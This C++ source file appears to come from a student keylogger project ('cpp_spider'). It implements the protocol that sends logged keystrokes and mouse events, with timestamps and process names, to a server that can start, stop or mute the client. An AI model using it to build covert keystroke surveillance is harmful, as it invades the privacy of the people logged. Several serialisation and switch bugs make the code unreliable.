//
// Protocolv1.cpp for Protocolv1 in /home/plasko_a/projet/cplusplus/cpp_spider/lib/protocolv1/source
// 
// Made by Antoine Plaskowski
// Login   <antoine.plaskowski@epitech.eu>
// 
// Started on  Thu Oct 22 09:18:51 2015 Antoine Plaskowski
// Last update Sun Oct 25 09:10:09 2015 Antoine Plaskowski
//

#include	<iostream>
#include	<cassert>
#include	<exception>
#include	"Protocolv1.hpp"

Protocolv1::Protocolv1(ISocket &socket, ITime &time) :
  m_socket(socket),
  m_last_read(time),
  m_mac_address(),
  m_packets({}),
  m_write(0),
  m_to_write(0),
  m_buffer({}),
  m_read(0),
  m_is_connect(false),
  m_is_stop(false),
  m_is_mute(false)
{
  assert(sizeof(m_buffer.packet) == sizeof(m_buffer.buffer));
}

Protocolv1::~Protocolv1(void)
{
  delete (&m_socket);
  delete (&m_last_read);
}

bool	Protocolv1::run(IDatabase const &database, ITime const *time)
{
  if (time != nullptr)
    if (timeout(*time) == true)
      return (true);
  if (m_socket.can_read() == true)
    if (read(database) == true)
      return (true);
  if (m_socket.can_write() == true)
    return (write());
  return (false);
}

bool	Protocolv1::select(void) const
{
  m_socket.want_read();
  if (m_to_write != m_write)  
    m_socket.want_write();
  return (false);
}

bool	Protocolv1::timeout(ITime const &time)
{
  uintmax_t	second = m_last_read.get_second();
  uintmax_t	nano = m_last_read.get_nano();

  m_last_read.now();
  m_last_read.set_second(m_last_read.get_second() - second);
  m_last_read.set_nano(m_last_read.get_nano() - nano);
  if (m_last_read.get_second() > time.get_second())
    return (true);
  if (m_last_read.get_second() == time.get_second())
    if (m_last_read.get_nano() > time.get_nano())
      return (true);
  if (m_last_read.get_second() > time.get_second() / 2)
    return (write_ping());
  if (m_last_read.get_second() == time.get_second() / 2)
    if (m_last_read.get_nano() > time.get_nano() / 2)
      return (write_ping());
  return (false);
}

bool	Protocolv1::read(IDatabase const &database)
{
  m_last_read.now();
  uintmax_t	ret = m_socket.read(m_buffer.buffer[m_read], sizeof(m_buffer) - m_read);
  if (ret == 0)
    return (true);
  m_read += ret;

  if (m_read < sizeof(m_buffer.packet.header))
    return (false);
  if (m_read < sizeof(m_buffer.packet.header) + m_buffer.packet.header.size)
    return (false);
  m_read = 0;

  switch (m_buffer.packet.header.opcode)
    {
    case (RESULT):
      return (read_result());
    case (MAC_ADDRESS):
      return (read_mac_address());
    case (VERSION):
      return (read_version());
    case (CONNECT):
      return (read_connect());
    case (DISCONNECT):
      return (read_disconnect());
    case (SERVERCMD):
      return (read_servercmd());
    case (CLIENTLOG):
      return (read_clientlog(database));
    case (PING):
      return (read_ping());
    case (PONG):
      return (read_pong());
    case (KEYBOARD):
      return (read_keyboard(database));
    case (MOUSE):
      return (read_mouse(database));
    };
  return (true);
}

bool	Protocolv1::write(void)
{   
  if (m_to_write != m_write)
    {
      Packet	&packet = m_packets[m_to_write++];

      uintmax_t	ret = m_socket.write(*packet.buffer, sizeof(packet.packet.header) + packet.packet.header.size);
      if (ret != sizeof(packet.packet.header) + packet.packet.header.size)
	return (true);
    }
  return (false);
}

bool	Protocolv1::server_command(Commandcode command)
{
  return (write_servercmd(command));
}

std::string const     &Protocolv1::get_mac_address(void) const
{
  return (m_mac_address);
}

bool	Protocolv1::mac_address(std::string const &mac_address)
{
  return (write_mac_address(mac_address));
}

bool	Protocolv1::log(std::string const &log)
{
  return (write_clientlog(log));
}

bool	Protocolv1::keyboard(ITime const &time, std::string const &event, std::string const &key, std::string const &process)
{
  return (write_keyboard(time, event, key, process));
}

bool	Protocolv1::mouse(ITime const &time, uintmax_t x, uintmax_t y, uintmax_t amout, std::string const &event, std::string const &button, std::string const &process)
{
  return (write_mouse(time, x, y, amout, event, button, process));
}

bool	Protocolv1::read_result(void)
{
  switch (m_buffer.packet.data[0])
    {
    case (NO_ERROR):
      std::cout << "no_error" << std::endl;
      return (false);
    case (IGNORED):
      std::cout << "ignored" << std::endl;
      break;
    case (UNKNOWN_ERROR):
      std::cout << "unknow_error" << std::endl;
      break;
    case (CLIENT_ALREADY_STARTED):
      std::cout << "client_already_started" << std::endl;
      break;
    case (CLIENT_ALREADY_STOPPED):
      std::cout << "client_already_stopped" << std::endl;
      break;
    case (CLIENT_ALREADY_MUTED):
      std::cout << "client_already_muted" << std::endl;
      break;
    case (CLIENT_ALREADY_UNMUTED):
      std::cout << "client_already_unmuted" << std::endl;
      break;
    case (INVALID_COMMAND):
      std::cout << "invalid_command" << std::endl;
      break;
    case (INVALID_KEYBOARD_INPUT):
      std::cout << "invalid_keyboard_input" << std::endl;
      break;
    case (INVALID_MOUSE_INPUT):
      std::cout << "invalid_mouse_input" << std::endl;
      break;
    case (UNKNOWN_ID):
      std::cout << "unknown_id" << std::endl;
      break;
    case (WRONG_PROTOCOL_VERSION):
      std::cout << "wrong_protocol_version" << std::endl;
      break;
    case (WRONG_MAC_ADDRESS):
      std::cout << "wrong_mac_address" << std::endl;
      break;
    case (CONNECT_FAIL):
      std::cout << "connect_fail" << std::endl;
      break;
    case (DISCONNECT_FAIL):
      std::cout << "disconnect_fail" << std::endl;
      break;
    }
  std::cout << "id du proccesus " << m_buffer.packet.data[1] << std::endl;
  return (true);
}

bool	Protocolv1::write_result(Errorcode code, uint8_t id)
{
  Packet	&packet = m_packets[m_write];

  packet.packet.data[0] = code;
  packet.packet.data[1] = id;
  return (write_packet(RESULT, 2));
}

bool	Protocolv1::read_mac_address(void)
{
  m_mac_address.erase();
  for (uintmax_t i = 0; i < 6 && i < sizeof(m_buffer.packet.data); i++)
    m_mac_address += m_buffer.packet.data[i];
  return (false);
}

bool	Protocolv1::write_mac_address(std::string const &mac_address)
{
  Packet	&packet = m_packets[m_write];

  for (uintmax_t i = 0; i < 6 && i < mac_address.size(); i++)
    packet.packet.data[i] = mac_address[i];
  return (write_packet(MAC_ADDRESS, 6));
}

bool	Protocolv1::read_version(void)
{
  if (m_buffer.packet.data[0] == 1)
    return (write_result(NO_ERROR, m_buffer.packet.header.id));
  return (write_result(WRONG_PROTOCOL_VERSION, m_buffer.packet.header.id));
}

bool	Protocolv1::write_version(void)
{
  Packet	&packet = m_packets[m_write];

  packet.packet.data[0] = 1;  
  return (write_packet(VERSION, 1));
}

bool	Protocolv1::read_connect(void)
{
  m_is_connect = true;
  return (false);
}

bool	Protocolv1::write_connect(void)
{
  return (write_packet(CONNECT, 0));
}

bool	Protocolv1::read_disconnect(void)
{
  m_is_connect = false;
  return (true);
}

bool	Protocolv1::write_disconnect(void)
{
  return (write_packet(DISCONNECT, 0));
}

bool	Protocolv1::read_servercmd(void)
{
  switch (m_buffer.packet.data[0])
    {
    case (START):
      m_is_stop = false;
    case (STOP):
      m_is_stop = true;
    case (MUTE):
      m_is_mute = true;
    case (UNMUTE):
      m_is_mute = false;
    }
  return (false);
}

bool	Protocolv1::write_servercmd(Commandcode command)
{
  Packet	&packet = m_packets[m_write];

  packet.packet.data[0] = command;
  return (write_packet(SERVERCMD, 1));
}

bool	Protocolv1::read_clientlog(IDatabase const &database)
{
  std::string	log;
  uintmax_t	i = 1;

  for (uintmax_t j = 0; j < m_buffer.packet.data[0]; j++)
    log.push_back(m_buffer.packet.data[i++]);
  std::cout << log << std::endl;
  return (false);
}

bool	Protocolv1::write_clientlog(std::string const &log)
{
  Packet	&packet = m_packets[m_write];
  uintmax_t	size = 0;

  packet.packet.data[size++] = log.size();
  for (uintmax_t i = 0; i < UINT8_MAX && i < log.size(); i++)
    packet.packet.data[size++] = log[i];
  return (write_packet(CLIENTLOG, size));
}

bool	Protocolv1::read_ping(void)
{
  return (write_pong());
}

bool	Protocolv1::write_ping(void)
{
  return (write_packet(PING, 0));
}

bool	Protocolv1::read_pong(void)
{
  return (write_ping());
}

bool	Protocolv1::write_pong(void)
{
  return (write_packet(PONG, 0));
}

bool	Protocolv1::read_keyboard(IDatabase const &database)
{
  uint64_t	second = 0;
  uint64_t	nano = 0;
  std::string	event;
  std::string	key;
  std::string	process;
  uintmax_t	i = 0;
  uintmax_t	size_array = m_buffer.packet.data[i++];
  uintmax_t	size;
  
  for (uintmax_t k = 0; k < size_array; k++)
    {
      for (uintmax_t j = 0; j < sizeof(uint64_t); j++)
	second += (m_buffer.packet.data[i++] << ((sizeof(uint64_t) - j - 1) * sizeof(uint8_t)));
      for (uintmax_t j = 0; j < sizeof(uint64_t); j++)
	nano += (m_buffer.packet.data[i++] << ((sizeof(uint64_t) - j - 1) * sizeof(uint8_t)));
      size = i;
      for (uintmax_t j = 0; j < m_buffer.packet.data[size]; j++)
	event.push_back(m_buffer.packet.data[i++]);
      std::cout << event << std::endl;
      size = i;
      for (uintmax_t j = 0; j < m_buffer.packet.data[size]; j++)
	key.push_back(m_buffer.packet.data[i++]);
      std::cout << key << std::endl;
      size = i;
      for (uintmax_t j = 0; j < m_buffer.packet.data[size]; j++)
	process.push_back(m_buffer.packet.data[i++]);
      std::cout << process << std::endl;
    }
  return (false);
}

bool	Protocolv1::write_keyboard(ITime const &time, std::string const &event, std::string const &key, std::string const &process)
{
  Packet	&packet = m_packets[m_write];
  uint16_t	size = 0;

  for (uintmax_t i = 0; i < sizeof(uint64_t); i++)
    packet.packet.data[size++] = (time.get_second() >> i * sizeof(uint8_t));
  for (uintmax_t i = 0; i < sizeof(uint64_t); i++)
    packet.packet.data[size++] = (time.get_nano() >> i * sizeof(uint8_t));
  packet.packet.data[size++] = event.size();
  for (uintmax_t i = 0; i < UINT8_MAX && i < event.size(); i++)
    packet.packet.data[size++] = event[i];
  packet.packet.data[size++] = key.size();
  for (uintmax_t i = 0; i < UINT8_MAX && i < key.size(); i++)
    packet.packet.data[size++] = key[i];
  packet.packet.data[size++] = process.size();
  for (uintmax_t i = 0; i < UINT8_MAX && i < process.size(); i++)
    packet.packet.data[size++] = process[i];
  return (write_packet(KEYBOARD, size));
}

bool	Protocolv1::read_mouse(IDatabase const &database)
{
  uint64_t	second = 0;
  uint64_t	nano = 0;
  uint32_t	x = 0;
  uint32_t	y = 0;
  std::string	event;
  std::string	button;
  std::string	process;
  uintmax_t	i = 0;
  uintmax_t	size_array = m_buffer.packet.data[i++];
  uintmax_t	size;
  
  for (uintmax_t k = 0; k < size_array; k++)
    {
      for (uintmax_t j = 0; j < sizeof(uint64_t); j++)
	second += (m_buffer.packet.data[i++] << ((sizeof(uint64_t) - j - 1) * sizeof(uint8_t)));
      for (uintmax_t j = 0; j < sizeof(uint64_t); j++)
	nano += (m_buffer.packet.data[i++] << ((sizeof(uint64_t) - j - 1) * sizeof(uint8_t)));
      for (uintmax_t j = 0; j < sizeof(uint32_t); j++)
	x += (m_buffer.packet.data[i++] << ((sizeof(uint32_t) - j - 1) * sizeof(uint8_t)));
      for (uintmax_t j = 0; j < sizeof(uint32_t); j++)
	y += (m_buffer.packet.data[i++] << ((sizeof(uint32_t) - j - 1) * sizeof(uint8_t)));
      size = i;
      for (uintmax_t j = 0; j < m_buffer.packet.data[size]; j++)
	event.push_back(m_buffer.packet.data[i++]);
      std::cout << event << std::endl;
      size = i;
      for (uintmax_t j = 0; j < m_buffer.packet.data[size]; j++)
	button.push_back(m_buffer.packet.data[i++]);
      std::cout << button << std::endl;
      size = i;
      for (uintmax_t j = 0; j < m_buffer.packet.data[size]; j++)
	process.push_back(m_buffer.packet.data[i++]);
      std::cout << process << std::endl;
    }
  return (false);
}

bool	Protocolv1::write_mouse(ITime const &time, uintmax_t x, uintmax_t y, uintmax_t amount, std::string const &event, std::string const &button, std::string const &process)
{
  Packet	&packet = m_packets[m_write];
  uint16_t	size = 0;

  for (uintmax_t i = 0; i < sizeof(uint64_t); i++)
    packet.packet.data[size++] = (time.get_second() >> i * sizeof(uint8_t));
  for (uintmax_t i = 0; i < sizeof(uint64_t); i++)
    packet.packet.data[size++] = (time.get_nano() >> i * sizeof(uint8_t));
  for (uintmax_t i = 0; i < sizeof(uint32_t); i++)
    packet.packet.data[size++] = (x >> i * sizeof(uint8_t));
  for (uintmax_t i = 0; i < sizeof(uint32_t); i++)
    packet.packet.data[size++] = (y >> i * sizeof(uint8_t));
  for (uintmax_t i = 0; i < sizeof(uint64_t); i++)
    packet.packet.data[size++] = (amount >> i * sizeof(uint8_t));
  packet.packet.data[size++] = event.size();
  for (uintmax_t i = 0; i < UINT8_MAX && i < event.size(); i++)
    packet.packet.data[size++] = event[i];
  packet.packet.data[size++] = button.size();
  for (uintmax_t i = 0; i < UINT8_MAX && i < button.size(); i++)
    packet.packet.data[size++] = button[i];
  packet.packet.data[size++] = process.size();
  for (uintmax_t i = 0; i < UINT8_MAX && i < process.size(); i++)
    packet.packet.data[size++] = process[i];
  return (write_packet(KEYBOARD, size));
}

bool	Protocolv1::write_packet(Opcode code, uint16_t size)
{
  Packet	&packet = m_packets[m_write];

  packet.packet.header.opcode = code;
  packet.packet.header.id = m_write;
  packet.packet.header.size = size;
  if (++m_write == m_to_write)
    m_to_write++;
  return (false);
}

ISocket const	&Protocolv1::get_isocket(void) const
{
  return (m_socket);
}

IProtocol	&new_iprotocol(ISocket &socket, ITime &time)
{
  return (*new Protocolv1(socket, time));
}
